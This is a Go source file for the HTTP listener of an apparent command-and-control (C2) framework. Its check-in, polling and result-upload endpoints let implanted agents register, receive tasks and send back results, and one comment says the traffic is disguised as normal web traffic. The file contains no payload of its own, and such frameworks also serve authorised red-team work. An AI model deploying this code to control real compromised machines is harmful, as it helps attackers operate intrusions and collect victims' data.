package httplistener

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"github.com/mjopsec/taburtuaiC2/listener"
)

// HTTPListener handles HTTP-based agent communication
type HTTPListener struct {
	config  *listener.Config
	handler listener.Handler
	server  *http.Server
	stats   *listener.Stats
	status  listener.Status
	mu      sync.RWMutex

	// Counters (atomic for concurrent access)
	bytesIn    int64
	bytesOut   int64
	totalReqs  int64
	errorCount int64
}

// New creates a new HTTP listener
func New(cfg *listener.Config, handler listener.Handler) *HTTPListener {
	return &HTTPListener{
		config:  cfg,
		handler: handler,
		stats: &listener.Stats{
			ListenerID: cfg.ID,
			StartedAt:  time.Now(),
		},
		status: listener.StatusStopped,
	}
}

// Start begins accepting HTTP connections
func (h *HTTPListener) Start(ctx context.Context) error {
	h.mu.Lock()
	h.status = listener.StatusStarting
	h.mu.Unlock()

	mux := http.NewServeMux()
	h.registerRoutes(mux)

	h.server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", h.config.Host, h.config.Port),
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	h.mu.Lock()
	h.status = listener.StatusRunning
	h.stats.StartedAt = time.Now()
	h.mu.Unlock()

	// Respect context cancellation
	go func() {
		<-ctx.Done()
		_ = h.Stop()
	}()

	if err := h.server.ListenAndServe(); err != http.ErrServerClosed {
		h.mu.Lock()
		h.status = listener.StatusError
		h.mu.Unlock()
		return fmt.Errorf("http listener error: %v", err)
	}

	return nil
}

// Stop shuts down the listener
func (h *HTTPListener) Stop() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	if h.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := h.server.Shutdown(ctx); err != nil {
			return err
		}
	}

	h.status = listener.StatusStopped
	return nil
}

func (h *HTTPListener) GetConfig() *listener.Config  { return h.config }
func (h *HTTPListener) GetStatus() listener.Status   { return h.status }
func (h *HTTPListener) GetStats() *listener.Stats    {
	h.stats.BytesIn = atomic.LoadInt64(&h.bytesIn)
	h.stats.BytesOut = atomic.LoadInt64(&h.bytesOut)
	h.stats.Errors = atomic.LoadInt64(&h.errorCount)
	return h.stats
}

// registerRoutes sets up all HTTP endpoints
func (h *HTTPListener) registerRoutes(mux *http.ServeMux) {
	// Agent check-in endpoint (disguised as normal web traffic)
	mux.HandleFunc("/checkin", h.handleCheckin)

	// Agent poll endpoint
	mux.HandleFunc("/poll", h.handlePoll)

	// Result submission endpoint
	mux.HandleFunc("/result", h.handleResult)
}

func (h *HTTPListener) handleCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	atomic.AddInt64(&h.totalReqs, 1)

	var data listener.CheckinData
	decoder := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1*1024*1024))
	if err := decoder.Decode(&data); err != nil {
		atomic.AddInt64(&h.errorCount, 1)
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	atomic.AddInt64(&h.bytesIn, r.ContentLength)

	resp, err := h.handler.OnCheckin(&data)
	if err != nil {
		atomic.AddInt64(&h.errorCount, 1)
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	h.writeJSON(w, resp)
}

func (h *HTTPListener) handlePoll(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.NotFound(w, r)
		return
	}

	atomic.AddInt64(&h.totalReqs, 1)
	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" {
		http.NotFound(w, r)
		return
	}

	resp, err := h.handler.OnPoll(agentID)
	if err != nil || resp == nil {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	h.writeJSON(w, resp)
}

func (h *HTTPListener) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	atomic.AddInt64(&h.totalReqs, 1)
	agentID := r.Header.Get("X-Agent-ID")

	body := make([]byte, 0)
	var buf [4096]byte
	for {
		n, err := r.Body.Read(buf[:])
		body = append(body, buf[:n]...)
		if err != nil || len(body) > 100*1024*1024 {
			break
		}
	}

	atomic.AddInt64(&h.bytesIn, int64(len(body)))

	if err := h.handler.OnResult(agentID, body); err != nil {
		atomic.AddInt64(&h.errorCount, 1)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
}

func (h *HTTPListener) writeJSON(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	encoded, _ := json.Marshal(data)
	atomic.AddInt64(&h.bytesOut, int64(len(encoded)))
	_, _ = w.Write(encoded)
}
